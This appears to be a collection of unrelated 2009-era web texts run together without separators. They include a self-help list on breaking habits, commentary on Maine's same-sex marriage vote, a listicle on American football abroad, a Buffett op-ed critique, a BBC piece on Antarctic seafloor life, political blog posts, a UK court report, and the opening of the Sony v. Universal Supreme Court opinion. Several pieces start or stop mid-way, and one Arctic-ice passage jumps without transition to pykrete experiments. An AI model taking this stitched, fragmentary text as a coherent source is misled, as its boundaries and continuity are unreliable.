Knowing how to break a bad habit will free precious time and resources .
Here ’s a list of 7 proven methods for breaking habits .
Feel free to add your own in the comments .
1. Cold Turkey
That ’s my preferred method , but it does n’t always work as expected .
Breaking a habit cold turkey requires a lot of raw energy .
Usually , I start breaking a habit cold turkey after a painful event generated by that habit .
For example , I quit smoking after a huge party which of course generated an awful hangover .
I felt so bad the next day that I instantly decided to quit smoking for good .
And I did it without any effort .
Or so I felt , like I did n’t make any effort .
Fact is I never had another cigarette after this event .
Breaking a bad habit cold turkey is one of the most empowering ways to handle habits .
Because you do n’t use any external support you gain enormous power over it .
You ’re actually become the master of that habit , commanding it to stop .
And if you manage to create a successful history of abruptly breaking other habits , you ’ll find it easier to do it again .
It builds confidence and experience .
But it ’s also one of the most unreliable ways to break a habit .
You may not have enough energy for it or you ’ll lack the external support for that .
Use with caution .
2. Find A Higher Stake
Sometimes , you do something because you ’re simply setting for less .
And you do n’t event know that .
When I was younger I had a gambling problem .
I used to practice my risk taking capacities against randomness .
Beating a slot machine seemed a worthy enough experience for me .
That gambling problem ended the moment I found a bigger challenge : creating my own company .
My risk taking capacities found a higher stake .
Now I was risking my money , my employees money and a lot of other things on the side .
All of a sudden , gambling was nothing .
Replacing the current stake of your habit with a bigger one always works .
We ’re designed to grow and evolve .
And our habit management system knows that .
So every time you ’re able to offer a new target to this habit management system , it will adapt very fast .
If you smoke because you ’re bored try crosswords or learn a new language .
If you ’re constantly late at work , try joining the Marines .
And if you ’re spending too much money , train to become a stock market broker .
3. Start A Parallel Habit
This method works by pressuring your focus span with more and more habits .
It ’s like squeezing too many groceries into one bag : at some point , the bag will crash .
For instance , if you have the habit of watching television at night , try getting your laptop closer and start checking email .
It seems like instead to break one habit , you ’re creating another one .
That ’s an illusion , because you ’re not creating a habit , you ’re pressuring your focus system with more stimulus .
At some point , your focus will break .
You wo n’t be able to enjoy tv , nor to understand something from your email .
And , surprisingly enough , you ’ll ditch both activities and settle for something new .
Perhaps a walk in the park or some small gardening .
Crowding your habit horizon with new and demanding activities will weaken you sooner or later and you ’ll end up getting rid of all the habits involved .
It ’s a little bit awkward , I agree , but it works .
4. Delegate It To Someone Else
If you do n’t have enough power to break up with your habit maybe it ’s time to bring somebody else in to help you with that .
Find somebody who ’s willing to help and give him power over your habit .
You can do this in many ways .
For instance , you can empower that person to perform some sort of physical action upon you every time you ’re caught in that nasty habit .
Every time you see me smoking , you can pinch me .
Or kick my ass .
Or just make fun of me .
It requires some extra work and an extra person but it ’s effective .
I know a case of somebody who just could n’t quit smoking .
He was quite a visible person in his town so after he tried many commercial products and attended many self help workshops , to no result , he decided to put a huge billboard with his picture on it and a very clear message : “ If you see me smoking , I ’ll pay you 100.000 dollars ” .
Last time I heard he never had a cigarette since then .
100.000 dollars is a pretty big sum .
5. Pay Yourself Out Of It
Give yourself small rewards .
Every time you ’re avoiding that habit , mark the moment with a positive action .
Yes , it ’s a bribe , but desperate situations needs desperate solutions .
And you do n’t have to give a huge bribe , small amounts , but enough to remember them .
In time , you ’ll create a new brain connection , based on pleasure , which will replace the old connection .
There is a danger however , and as you may imagine , that would be replacing the old bad habit with a new bad habit .
But you can avoid that situation with elegance , by choosing the appropriate reward .
The trick is , in the beginning , you can control the reward .
Do n’t settle for something you know you will create an addiction , focus on something constructive and useful .
For instance , instead of having a drink every time you need a cigarette , you could just read two pages from a book .
Yes , that could lead to a reading addiction .
Being addicted to books is far more rewarding than smoking or drinking , anyway .
6. Isolate From People With Similar Habits
You have no idea how much the environment is influencing you .
Sometimes , all you need in order to get rid of a nasty habit is to change the environment .
The need for social acceptance – or should I say complacency – is so strong that we ’re sometimes doing things we would n’t even imagine doing in difference circumstances .
So , isolating yourself from people with identical habits will definitely help .
And you do n’t have to be very vocal about it , start by ignoring .
Do n’t go out “ for a few drinks ” with the same gang .
Do n’t smoke your 10 minutes break with the same smokers you use to .
This is one of the most difficult ways to break a habit because it actually touches your social network .
But before making any assumptions , rest assured that your bad habits are pressuring your social life in a far more unpleasant way .
Losing a few friends will not kill you , but drinking your life day after day will surely do .
If you have the power to realize that what keeps you together is just sharing the same bad habit and nothing more , then half of the journey is done .
7. Keep A Time Log
Write down everything you do during a day .
If you can do it every hour that would be awesome .
Be sure you ’re properly equipped so you can do this even when you ’re on the road .
Have pen and paper with you .
Put hourly phone alarms .
And then do this for a whole week .
And then , after the first week , do it for a full month .
This habit in itself is a pretty difficult one , I admit , but it ’s really , really beneficial .
Most of the time you wo n’t need a full month to spot your time holes .
It will be obvious in the first week .
Now , after keeping this time log , do the math .
How much time are you really living and how much time are you on auto - pilot ?
If you spend more time on auto - pilot than on actual living , then you have a problem .
Now , write the results down , with the total of your time holes really standing out and stick it in very visible places : on the fridge , on the door , on the ceiling of your bedroom .
At some point , seeing day after day how much time are you really losing , you ’ll end up that habit .
***
Do you have any preferred way to get rid of bad habits ?
Would love to see it in the comments .

November 5 , 2009
Sherry Wolf , author of Sexuality and Socialism : History , Politics and Theory of LGBT Liberation , analyzes why the right won in its campaign against LGBT equality in Maine .
IN STARK contrast to the surge of pro-LGBT activism , and legislative and legal progress in recent months , Maine voters overturned equal marriage rights on Election Day by a margin of 53 percent to 47 percent .
Voter turnout of nearly 50 percent , local efforts by 8,000 volunteers -- many of them straight -- and a national blitz of phone banking to try to sway Mainers to uphold equal marriage was not sufficient to retain same - sex marriage in that state .
Maine 's Question 1 -- similar to California 's Proposition 8 that reversed same - sex marriage rights in that state exactly a year ago - - once again placed civil rights on the ballot , this time in an off - year election .
In Washington state , a new law that greatly expands the rights of LGBT couples -- though does n't grant marriage itself - - was approved by voters , but by an unexpectedly narrow margin of 51 percent to 49 percent .
The failure of the same - sex marriage forces in Maine 's
No on 1 campaign to retain marriage equality passed earlier this year by the legislature highlights four central problems :
1 ) Civil rights activists are weakest outside of urban areas where the financial and institutional resources of the right can dominate rural politics ;
2 ) President Obama and the Democrats have failed to deliver on their promise of " fierce advocacy " of LGBT civil rights ; 3 ) LGBT rights must be enacted into law by the federal government ; and 4 ) Civil rights should not be reduced to election fodder to be manipulated by well - financed bigots .
Marching in support of marriage equality
NATIONWIDE , LGBT activists scrambled in a monumental effort to try to stop right - wingers in Maine from succeeding in what was often termed a " mini - Prop 8 " effort that relied on money from the Catholic Church and blitzed the media with lies about how gay marriage would be taught in the schools and imposed on religious institutions .
Local groups will assess the No on 1 organizing efforts in coming weeks , but suffice it to say that despite what appears to have been an energetic and collaborative campaign , equal marriage has lost in every state it has been put to a popular vote - - 31 in all .
Despite the fact that the No on 1 campaign , Protect Maine Equality , raised $ 4 million and the anti-same - sex marriage forces raised only $ 2.5 million , the strategy of statewide ballot initiatives plays to activists ' weaknesses , especially in non-urban areas .
In addition to the purposely confusing language used by the right in these initiatives -- voting " yes " denied equality , voting " no " would have retained it -- larger population centers create opportunities for activists to reach people in groups , as in Portland , Maine , where the vote was an overwhelming 73 percent against Question 1 .
At University of Maine 's Orono campus , 81 percent of students voted against taking away equal marriage rights , also showing the generation gap that persists on this question .
Similarly , in Washington state , it was urban King County that voted overwhelmingly for the " everything but marriage " referendum , while the less populated eastern part of the state voted against it .
Just three weeks after the massively successful LGBT National Equality March that drew more than 200,000 people demanding full federal equality now , conservatives are punching back .
Right - wing bigots like Pat Robertson have attacked recently enacted federal hate crimes legislation , saying , " The noose has tightened around the necks of Christians to keep them from speaking out on certain moral issues . "
In the face of this hostility and legal challenges , the Democrats have been passive at best and hostile at worst .
The White House and Congress have failed to deliver so far on promises to reverse decades of legal discrimination in federal and state laws .
When Attorney General Eric Holder was asked about Maine 's Question 1 , he said that he and President Obama " are of the view it is for states to make these decisions . "
Holder later said to one blogger , " I do n't really know enough about the referendum over there to comment . "
As National Equality March organizer Cleve Jones said on MSNBC of President Obama 's silence on Question 1 , " This is a far cry from the fierce advocacy he promised us in his campaign . "
Even more outrageous , not only did the Democratic National Committee ( DNC ) refuse to help finance the No on 1 campaign , but it expressed crass indifference to LGBT rights when the DNC 's organization " Organizing for America " ( formerly known as " Obama for America " ) e-mailed Maine voters the day before the election about getting involved ... in the gubernatorial contest in New Jersey ( which lost ) !
The failure of the Democrats to hold onto huge gains made in the 2008 election in New Jersey and Virginia gubernatorial races -- and the flaccid response from Obama 's base in this off - year election -- reveals that the inability of the Democrats in power to deliver on their promises is alienating progressives .
" President Obama and his team were zero help in this critical battle , and in the last week might actually have hurt us , " said David Mixner , long - time Democratic Party activist and initiator of the call for the National Equality March .
MAINE'S REVERSAL on marriage equality proves once again the bankruptcy of the state - by - state , issue - by - issue strategy upheld by many establishment LGBT forces .
This approach concedes that civil rights must remain on the precarious turf of the states , in a country where one Constitution is supposed to guarantee equal protection under the law .
Activists can no longer accept that LGBT civil rights can be attained outside the federal government .
Even if Maine voters had rejected Question 1 , most marriage rights like Social Security are only gained through the federal government and married LGBT people in Maine , as in the equal marriage states , would have remained second - class citizens under the law .
The right 's strategy of placing LGBT civil rights on state ballots for a vote places the battle for human equality on an unstable and hostile terrain .
Why should anyone have to battle in each locality for equal treatment in a country where the 14th Amendment -- passed after the Civil War ! -- guarantees equal protection to all U.S. citizens ?
Why should LGBT people have to repeatedly reassert that we are equal human beings in every state and municipality 45 years after the Civil Rights Act prohibited discrimination ?
Civil rights cannot wait for the approval of reactionaries .
According to that logic , Blacks , too , should have waited for public opinion to catch up with their demands .
But in 1968 , one year after the Supreme Court struck down bans on interracial marriage as unconstitutional , Gallup polls showed that only 20 percent of Americans approved of marriages between Blacks and whites .
The failure of Maine 's No on 1 campaign highlights why the National Equality March demand for full equality in all matters of civil law in all 50 states must continue to be the rallying cry of grassroots activists across the country .
This is the Week of Initiative called by Equality Across America , the national network attempting to gather these groupings to map out a national strategy to continue this fight .
In cities and towns across the country this week , activists will be marching and protesting this defeat in Maine - - and celebrating victories in Washington state and Kalamazoo , Mich. , where pro-LGBT referenda passed .
Remember Maine .
Get out and organize for full federal equality now !
( Newser ) – Americans are embracing the no-frills attitude necessitated by the recession , USA Today reports .
One - third say they are spending less and plan to keep up the practice as their “ new , normal ” way of living , according to a study .
A whopping 47 % of Americans say they have all they need , another study shows , up from 34 % in 2006 .
“ The silver lining is that people are coming to realize they can live with less and their lives are richer for it , ” a professor says .
“ People are feeling forced and inspired to get back to what is core to them , ” an author says .
Films and websites devoted to consuming less and being environmentally conscious have seen an upsurge in views , and people are turning out in droves to attend self - help courses in weathering the downturn .
One course , in “ voluntary simplicity , ” has seen enrollment jump 50 % in the last year .

The NFL's Tampa Bay Buccaneers recently played the New England Patriots at Wembley Stadium in London , whose citizenry maintain a cult appreciation for the sport following the decline of its popularity there during the 1990s .
Several countries - including Japan , Germany and Mexico - maintain American football leagues .
The question remains , though , why football has only achieved nominal popularity around the globe .
Unless a modifying term like " American " or " gridiron " is adopted at home , it will continue to be ridiculed as " illegitimate " football by " real " football ( soccer ) fans .
2. Identity crisis
Before McDonald 's and Coca - Cola , there was the British Empire .
Rugby thus retains a strong foothold in countries within the British sphere of influence , where football is seen as a perversion of the sport ( though Canada and Australia also have their homegrown derivations ) .
3. Complexity
The rules and strategies involved in football are exceedingly more complex than most popular world sports today .
The harder it is to understand a concept , the harder it is for it to diffuse ( see : curling ) .
4. Cost
With all the safety equipment required - helmets , shoulder and assorted body pads , neck rolls , mouth guards , etc. - it 's a lot more expensive to maintain a professional team .
This inhibits interest in most developing countries ( see : poverty ) .
5. Commercialization
Excessive stoppage time in football has come to be seen as an instrument for marketing .
Though no professional sport is " pure , " there is a threshold for what foreign demographics are willing to accept .
6. Monopolization
With the NFL having no major competition from other domestic leagues ( see : AFL , XFL , UFL , et. al ) , efforts to popularize the sport are limited to a single homogenous governing body , which decreases the chance of success - especially with respect to bad business practices ( see : NFL Europa ) .
7. Indoctrination
American children are exposed to football from an early age , and an outlet is provided to them from pee - wee all the way up to high school .
Perhaps it 's a chicken - or - the - egg argument , but without a system like this , a country will not produce enough competitive athletes ( see item 9 ) .
8. Body Mass Index
In 2003 , 56 percent of NFL players qualified as obese .
With a 31 percent obesity rate among Americans , our talent pool of generously proportioned athletes is , well , generously disproportionate .
9 . The Yao Ming Factor
Sports need foreign popularizers in order to succeed globally , but the NFL has a negligible percentage of international players .
Most countries do n't have the infrastructure to create cultural phenoms , as in the case of Yao Ming and basketball in China .
10 . Militarism
Football became widely introduced to foreign countries by American servicemen after World War II .
Though this explains why it 's more popular in Germany and Japan , this association remains detrimental for any number of reasons .
11 . Nationalism
Football fans could n't really care less if the rest of the world appreciates the sport .
Furthermore , they relish the fact that football remains an American idiosyncrasy .
Warren Buffett is back as the nation ’s financial conscience , publishing an op - ed in yesterday ’s NYT lamenting the dangers of too much monetary and fiscal stimulus .
As regular readers of this blog are aware , that ’s a message with which I wholeheartedly agree .
My problem with Buffett ’s piece is that he makes a good argument and then totally undercuts it in his conclusion :
Our immediate problem is to get our country back on its feet and flourishing — “ whatever it takes ” still makes sense .
Once recovery is gained , however , Congress must end the rise in the debt - to - G.D.P. ratio and keep our growth in obligations in line with our growth in resources .
This have - your - cake - and - eat - it - too approach is typically what we get from Paul Krugman : Yeah , debt is a problem and has to be dealt with long - term , but in the meantime we should jack up deficit spending in order to boost growth .
To paraphrase St. Augustine , make us fiscally and monetarily prudent , just not yet .
Ben Bernanke said something of that sort in a speech .
He was trying to be funny .
The problem , it seems to me , is that rising GDP and employment — i.e. “ recovery ” — is not compatible with de-leveraging , which is what Buffett is talking about .
When consumers try to cut debt and boost savings , the economy goes into a deflationary spiral that Keynesians argue must be counteracted with fiscal and monetary stimulus .*
Consumers de-lever , government re-levers .
Private consumption and government spending now drive something like 80 % of GDP .
It ca n’t keep rising unless consumers , the government or both continue borrowing huge sums .
The goldilocks economy Buffett describes , in which we can have “ recovery ” without increasing debt , is a fantasy .
My point is that in order to reduce debt we have to endure some sort of deflationary recession .
The alternative is to spend and print perpetually , which Buffett points out is the worse option .
What Buffett should have said ?
Suck it up folks , we ’ve no choice but to learn to live with less .
——
P.s. : I think Buffett actually knows this , but being asset - rich , he ’s boxed in .
Deflation hammers the value of all non-cash assets , so he has to support monetary / fiscal stimulus in order to preserve his own and his shareholders ’ wealth .
Hence the opening of the piece , which lauds the “ wisdom , courage and decisiveness ” of the Bush and Obama administrations in the face of collapse , and the end of the piece , which says their emergency measures continue to be necessary .
He maligns the effects of stimulus , but he ’s stuck supporting it .
* The “ Paradox of Thrift ” this is called , a particularly problematic economic theory used to justify heavy government borrowing .

Advertisement Deep under the Antarctic ice , a rare , colourful burst of starfish and 3 m - long monster worms has been filmed by a BBC camera crew .
Filmed in time - lapse , the extraordinary swarm of deep - sea creatures gathers to feed in a frenzy on the body of a seal , which had sunk to the ocean floor .
Such a bounty of food may only occur once every ten years in the ice - cold waters of McMurdo Sound , Antarctica .
The images were taken by divers filming for the natural history series Life .
Descending through a hole cut in the ice , cameramen Doug Allan and Hugh Miller set up a time - lapse camera on the ocean floor .
The time - lapse sequence revealed the feeding frenzy of hundreds of huge worms , starfish , brittle stars and sea-urchins .
Long way down Nemertine worms , also known as boot - lace or ribbon worms , belong in their own phylum , the Nemertea .
Some species are scavengers or herbivores , but most are voracious predators , catching prey using a proboscis that shoots out from their mouth .
The proboscis may be poisonous or even tipped with a sticky secretion , depending on the type of worm .
In Antarctica , such worms often feed on clams and shellfish .
However , they also congregate with starfish , which are also called sea stars , to feed on seal droppings .
In the sequence filmed for the Life series , the invertebrates gather in a frenzy to feast on a seal carcass that has sunk to the ocean floor .
So much food may only arrive in one place once in a decade .
The nemertine worms ( Parbolasia corrugatus ) are able to puncture the seal 's skin with their proboscis , opening up the carcass , so that worms and marine isopods such as woodlice can enter to feed .
The starfish feed more slowly - by pushing out their stomachs through their mouths .
As a sea star pushes its stomach against the seal 's skin , it secretes digestive juices that dissolve the seal 's tissue .
A burst of sea stars
Sea urchins , such as Sterechinus neumayeri , also get in on the act .
Like the giant worms , this species comes in a variety of colours .
Not only does it sometimes camouflage itself with bits of shell , but it can live for up to 40 years .
Because of the cold temperatures , many creatures under the ice grow extremely slowly .
But by doing so , they can reach a great age and a great size .
Touching moment
In temperate and tropical seas , other more common predators dominate , such as crabs .
However , the fossil record shows these animals vanished from the waters of Antarctica about 35 million years ago , when the continent cooled .
Today , Antarctica has no lobsters or crabs .
There are also few fish , such as sharks and rays .
Instead strange animals lurk there , including sea urchins , sea stars , giant worms and large underwater sea spiders , which can grow up to 30 cm across and live for several decades .
However , last year researchers warned that if global warming continues , it will put this unique marine life at risk .
A nemertine worm 's deadly proboscis
In the last 50 years , sea surface temperatures around Antarctica have risen by 1 - 2C , which is more than twice the global average .
That could encourage crabs to colonise the region , followed by fish such as sharks , which are capable of decimating the local wildlife .
If that does happen , the Antarctic seafloor would no longer be dominated by soft - bodied , slow - moving invertebrates , which are believed to be similar to those found in ancient oceans prior to the evolution of shell - crushing predators .
' The Deep ' episode of the BBC natural history series Life will be broadcast at 2100GMT on BBC One on Monday 30 November .

Donny Deutsch was on MSNBC ’s Morning Joe this morning , and in response to a new poll that found that Rush Limbaugh and Glenn Beck are the most influential conservatives in America , he said , “ These are all entertainers .
They ’re circus acts . ”
Deutsch was asked about Lou Dobbs , and he said Dobbs is a racist .
Here is the video courtesy of Media Matters :

While discussing the results of the poll , Deutsch said , “ That ’s an impressive foursome .
That tells me if I am a Democrat I am very happy . ”
Jim Cramer pointed out that they should use book sells to measure popularity , and Deutsch replied , “ Jim , there is a difference between being a popular media figure and an electable candidate , and you ’ve got to start to make that distinction .
These are all entertainers .
They ’re circus act , and will they be elected , no . ”
Jim Cramer asked Deutsch if he thought Lou Dobbs was an acceptable candidate .
Deutsch answered , “ Uh , I do n’t think so actually .
I do n’t think so .
Maybe because he is a racist is pretty much the reason why . ”
The person in charge of the censor button at MSNBC must get very nervous when Donny is on the air .
Remember , the last time Donny was on Morning Joe he called Rush Limbaugh a douche .
Deutsch does n’t pull any punches , and I really it would be great to see him back on the air on a nightly basis .
His point about the results of the poll is right on the money .
Democrats are giddy when they see Limbaugh , Beck , Cheney , and Palin listed as the four most influential conservatives in America , because none of those four are electable .
Each of them makes the GOP appear more out of touch and extreme .
Sometimes referred to as the Earth 's air - conditioner , the Arctic Sea plays a vital role in the world 's climate .
As Arctic ice melts in summer , it exposes the darker - colored ocean water , which absorbs sunlight instead of reflecting it , accelerating the effect of global warming .
Dr Martin Sommerkorn , from the environmental charity WWF's Arctic program , which worked on the survey , said the predicted loss of ice could have wide - reaching affects around the world .
" The Arctic Sea ice holds a central position in our Earth 's climate system .
Take it out of the equation and we are left with a dramatically warmer world , " he said .
" This could lead to flooding affecting one - quarter of the world 's population , substantial increases in greenhouse gas emissions .... and extreme global weather changes . "
The third test involved determining how long small - scale boats made of each material ( ice , pykrete , pseudo - pykrete ) would maintain its integrity in warm water before total failure due to melting .
The ice boat failed in approximately 1 minute ; the pykrete failed after 5 minutes ; while the pseudo - pykrete maintained its integrity for almost 60 minutes .
pykrete proved 60 times more resistant to melting when compared to normal ice .
During the ice - formation season in the Arctic , why not drop tons of shredded newsprint / paper / wood pulp over the area ?

Builders flee naked blonde woman
( Agencies )
Updated : 2009-09-17 11:36
A group of builders in Vienna fled their site after a naked blonde woman ran after them , it has been claimed .
According to RealItatea , the woman scared off the construction workers when she rushed after them and shouted : " Who wants me ? "
One builder reportedly said : " We like to chat up girls as they walk past - it 's a tradition .
" But this woman was too much to handle and we just ran and hid until the police got here .
No - one liked to think what would happen if she caught one of us . "
Police spokesman Mario Hejl said : " It turned out no - one wanted her .
The woman was detained and was put under a doctor 's care . "
Malcolm Searles used sirens and blue lights during the errand A former Metropolitan police officer who killed a pedestrian while on a personal errand in a patrol car has been jailed for six - and - a - half years .
Malcolm Searles , 24 , admitted causing the death by dangerous driving of Sandra Simpson , 61 , as he went to deliver a birthday card last August .
Mrs Simpson died after the crash in Bromley , south - east London .
Searles , from Kent , used sirens and blue lights , while speeding , London 's Southwark Crown Court heard .
The court heard how Searles , from North View , Swanley , Kent , had been on a " hair raising joy - ride " , during which he was clocked doing 104 mph in a 40 mph zone .
Sacked from force Seconds before the crash on 23 August , Searles had been driving at 56 mph in a 30 mph zone .

After a " prolonged course of dangerous driving " covering a total of 22 miles and lasting over an hour , he hit Mrs Simpson .
" Had he been driving at the legal limit he would have been able to stop , " Michael Mulkerris , prosecuting , told the court .
The officer , who was based in Bromley police station , was charged after the Independent Police Complaints Commission ( IPCC ) investigated the fatal crash .
He was sacked from the Met in April following disciplinary action .
IPCC investigators found Searles had gone on the personal errand , while on duty , to his sister 's house in Swanley , Kent .
' Real character '
Later , he tried to lie his way out of trouble , claiming he had been following speeding car he believed had been stolen , Southwark Crown Court heard .
Sandra Simpson was with her husband Peter when she was killed Mrs Simpson was walking with her husband , Peter , in Homesdale Road at the time .
In a statement read to the court , Mrs Simpson 's husband said his office receptionist wife " had been my whole world " and since her death he had contemplated suicide .
" In short I have lost everything ... I loved her so much , " he said .
" If I had known Mr Searles was rushing to save someone that night that would have been some consolation .
" But it was an accident waiting to happen from the moment he drove off . "
Outside court , Mrs Simpson 's son- in - law , Luke Brooks , said , when they were told of the accident , the family 's " world fell apart " .
" Sandy was a real character who loved life and wherever she went , fun and laughter followed , " he added .

It 's hard to argue with rock solid logic that GOP strategist Karen Hanretty offers up on The Ed Show .
In a discussion of whether providing health care to all citizens is a moral imperative , Hanretty informs us that Jesus would probably not like health care reform because he would avoid the 1000 pages of bill Congress has drafted , just as he avoided the Pharisees .
SCHULTZ : Karen , where is the Christian leaders ( sic ) in this country , the four that I named at the top of this show tonight .
They ’ve been very silent on the moral obligation to cover every American .
This is a big play , what do you think ?
HANRETTY : Well , I think it ’s interesting .
You know , you were saying earlier if Christ came back , if this was the Second Coming , what would He do ?
And you know , we know when Christ walked the Earth he was very careful not to let the Pharisees entrap him in legalistic disputes .
And I think that would be the case with this 1,000 page health care bill .
I think that , you know , the Christian community , we have an obligation to care for the poor , and for children , orphans and widows , and that is our commandment .
I think a lot of churches do that .
I ’m not sure there ’s something in the Bible that talks about should you have a single health care payer program , you know , what are the details …
So the commandment to take care of others , that goes out the window if you have to trudge through several hundred pages of writing ?
I 'm not sure I like the " Jesus as a slacker " motif , but I have one way to simplify it : " Medicare for all " .
I think even your slacker Jesus could manage to read three words , Karen .
But honestly , it was the next exchange that made me cringe at what laughingstocks we must be to the rest of the world : the discussion of health care reform during End Times .
HANRETTY : I think it ’s very …
I think it ’s very … quite frankly , I think you really pushed the limits , Ed , when you say that if Christ came to Earth , he would encourage us to support this health care bill .
SCHULTZ : We ’re out of time with this , but I want to say that I ’m not pushing the limits on this , because if Jesus were to come back and have the Second Coming , while we ’re on the face of the Earth , I do n’t think he’d be denying care to anybody .
HANRETTY : You think in the middle of the Rapture , in the middle of the Rapture , he ’d be taking a health care survey ?
You ’re insane !
I love that .
That ’s crazy .
Yeah , thinking that Jesus would care for the least of us on this planet , that 's crazy , but believing in a Rapture overseen by a slacker Jesus , that 's totally normal .
Oy .

78 L.Ed.2d 574
SONY CORPORATION OF AMERICA , et al. , Petitioners
v .
UNIVERSAL CITY STUDIOS , INC . , etc. , et al .
No. 81-1687 .
Rehearing Denied March 19 , 1984 .
See U.S. , 104 S.Ct. 1619 .
Syllabus Petitioner Sony Corp. manufactures home video tape recorders ( VTR's ) , and markets them through retail establishments , some of which are also petitioners .
Respondents own the copyrights on some of the television programs that are broadcast on the public airwaves .
Respondents brought an action against petitioners in Federal District Court , alleging that VTR consumers had been recording some of respondents ' copyrighted works that had been exhibited on commercially sponsored television and thereby infringed respondents ' copyrights , and further that petitioners were liable for such copyright infringement because of their marketing of the VTR's .
Respondents sought money damages , an equitable accounting of profits , and an injunction against the manufacture and marketing of the VTR's .
The District Court denied respondents all relief , holding that noncommercial home use recording of material broadcast over the public airwaves was a fair use of copyrighted works and did not constitute copyright infringement , and that petitioners could not be held liable as contributory infringers even if the home use of a VTR was considered an infringing use .
The Court of Appeals reversed , holding petitioners liable for contributory infringement and ordering the District Court to fashion appropriate relief .
Held :
The sale of the VTR's to the general public does not constitute contributory infringement of respondents ' copyrights .
Pp. 428-456 . ( a ) The protection given to copyrights is wholly statutory , and , in a case like this , in which Congress has not plainly marked the course to be followed by the judiciary , this Court must be circumspect in construing the scope of rights created by a statute that never contemplated such a calculus of interests .
Any individual may reproduce a copyrighted work for a " fair use " ; the copyright owner does not possess the exclusive right to such a use .
Pp. 428-434 . ( b ) Kalem Co. v. Harper Brothers , 222 U.S. 55 , 32 S.Ct. 20 , 56 L.Ed. 92 , does not support respondents ' novel theory that supplying the " means " to accomplish an infringing activity and encouraging that activity through advertisement are sufficient to establish liability for copyright infringement .
This case does not fall in the category of those in which it is manifestly just to impose vicarious liability because the " contributory " infringer was in a position to control the use of copyrighted works by others and had authorized the use without permission from the copyright owner .
Here , the only contact between petitioners and the users of the VTR 's occurred at the moment of sale .
And there is no precedent for imposing vicarious liability on the theory that petitioners sold the VTR's with constructive knowledge that their customers might use the equipment to make unauthorized copies of copyrighted material .
The sale of copying equipment , like the sale of other articles of commerce , does not constitute contributory infringement if the product is widely used for legitimate , unobjectionable purposes , or , indeed , is merely capable of substantial noninfringing uses .
Pp. 434-442. ( c ) The record and the District Court 's findings show ( 1 ) that there is a significant likelihood that substantial numbers of copyright holders who license their works for broadcast on free television would not object to having their broadcast time - shifted by private viewers ( i.e. , recorded at a time when the VTR owner cannot view the broadcast so that it can be watched at a later time ) ; and ( 2 ) that there is no likelihood that time - shifting would cause nonminimal harm to the potential market for , or the value of , respondents ' copyrighted works .
The VTR's are therefore capable of substantial noninfringing uses .
Private , noncommercial time - shifting in the home satisfies this standard of noninfringing uses both because respondents have no right to prevent other copyright holders from authorizing such time - shifting for their programs , and because the District Court 's findings reveal that even the unauthorized home time - shifting of respondents ' programs is legitimate fair use .

Justice STEVENS delivered the opinion of the Court .
1 Petitioners manufacture and sell home video tape recorders .
Respondents own the copyrights on some of the television programs that are broadcast on the public airwaves .
Some members of the general public use video tape recorders sold by petitioners to record some of these broadcasts , as well as a large number of other broadcasts .
The question presented is whether the sale of petitioners ' copying equipment to the general public violates any of the rights conferred upon respondents by the Copyright Act .
2 Respondents commenced this copyright infringement action against petitioners in the United States District Court for the Central District of California in 1976 .
Respondents alleged that some individuals had used Betamax video tape recorders ( VTR's ) to record some of respondents ' copyrighted works which had been exhibited on commercially sponsored television and contended that these individuals had thereby infringed respondents ' copyrights .
Respondents further maintained that petitioners were liable for the copyright infringement allegedly committed by Betamax consumers because of petitioners ' marketing of the Betamax VTR's .
Respondents sought no relief against any Betamax consumer .
Instead , they sought money damages and an equitable accounting of profits from petitioners , as well as an injunction against the manufacture and marketing of Betamax VTR's .
3 After a lengthy trial , the District Court denied respondents all the relief they sought and entered judgment for petitioners .
480 F.Supp. 429 ( 1979 ) .
The United States Court of Appeals for the Ninth Circuit reversed the District Court 's judgment on respondent 's copyright claim , holding petitioners liable for contributory infringement and ordering the District Court to fashion appropriate relief .
659 F.2d 963 ( 1981 ) .
We granted certiorari , 457 U.S. 1116 , 102 S.Ct. 2926 , 73 L.Ed.2d 1328 ( 1982 ) ; since we had not completed our study of the case last Term , we ordered reargument , --- U.S. ----, 103 S.Ct. 3568 , 77 L.Ed.2d 1409 ( 1983 ) .
We now reverse .
4 An explanation of our rejection of respondents ' unprecedented attempt to impose copyright liability upon the distributors of copying equipment requires a quite detailed recitation of the findings of the District Court .
In summary , those findings reveal that the average member of the public uses a VTR principally to record a program he cannot view as it is being televised and then to watch it once at a later time .
This practice , known as " time - shifting , " enlarges the television viewing audience .
For that reason , a significant amount of television programming may be used in this manner without objection from the owners of the copyrights on the programs .
For the same reason , even the two respondents in this case , who do assert objections to time - shifting in this litigation , were unable to prove that the practice has impaired the commercial value of their copyrights or has created any likelihood of future harm .
Given these findings , there is no basis in the Copyright Act upon which respondents can hold petitioners liable for distributing VTR's to the general public .
The Court of Appeals ' holding that respondents are entitled to enjoin the distribution of VTR's , to collect royalties on the sale of such equipment , or to obtain other relief , if affirmed , would enlarge the scope of respondents ' statutory monopolies to encompass control over an article of commerce that is not the subject of copyright protection .
Such an expansion of the copyright privilege is beyond the limits of the grants authorized by Congress .
5 * The two respondents in this action , Universal Studios , Inc. and Walt Disney Productions , produce and hold the copyrights on a substantial number of motion pictures and other audiovisual works .
In the current marketplace , they can exploit their rights in these works in a number of ways : by authorizing theatrical exhibitions , by licensing limited showings on cable and network television , by selling syndication rights for repeated airings on local television stations , and by marketing programs on prerecorded videotapes or videodiscs .
Some works are suitable for exploitation through all of these avenues , while the market for other works is more limited .
6 Petitioner Sony manufactures millions of Betamax video tape recorders and markets these devices through numerous retail establishments , some of which are also petitioners in this action .
Sony 's Betamax VTR is a mechanism consisting of three basic components : ( 1 ) a tuner , which receives electromagnetic signals transmitted over the television band of the public airwaves and separates them into audio and visual signals ; ( 2 ) a recorder , which records such signals on a magnetic tape ; and ( 3 ) an adapter , which converts the audio and visual signals on the tape into a composite signal that can be received by a television set .
7 Several capabilities of the machine are noteworthy .
The separate tuner in the Betamax enables it to record a broadcast off one station while the television set is tuned to another channel , permitting the viewer , for example , to watch two simultaneous news broadcasts by watching one " live " and recording the other for later viewing .
Tapes may be reused , and programs that have been recorded may be erased either before or after viewing .
A timer in the Betamax can be used to activate and deactivate the equipment at predetermined times , enabling an intended viewer to record programs that are transmitted when he or she is not at home .
Thus a person may watch a program at home in the evening even though it was broadcast while the viewer was at work during the afternoon .
The Betamax is also equipped with a pause button and a fast - forward control .
The pause button , when depressed , deactivates the recorder until it is released , thus enabling a viewer to omit a commercial advertisement from the recording , provided , of course , that the viewer is present when the program is recorded .
The fast forward control enables the viewer of a previously recorded program to run the tape rapidly when a segment he or she does not desire to see is being played back on the television screen .
